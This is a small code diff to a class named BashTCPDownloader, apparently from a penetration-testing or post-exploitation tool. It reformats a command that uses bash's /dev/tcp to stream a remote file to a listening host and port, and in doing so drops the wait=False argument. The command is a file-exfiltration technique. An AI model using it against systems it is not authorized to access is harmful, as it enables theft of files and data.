@@ -17,7 +17,4 @@ class BashTCPDownloader(RawDownloader):
         lport = self.server.server_address[1]
         remote_path = shlex.quote(self.remote_path)
 
-        self.pty.run(
-            f"""bash -c "dd if={remote_path} > /dev/tcp/{lhost}/{lport}" """,
-            wait=False,
-        )
+        self.pty.run(f"""bash -c "dd if={remote_path} > /dev/tcp/{lhost}/{lport}" """,)
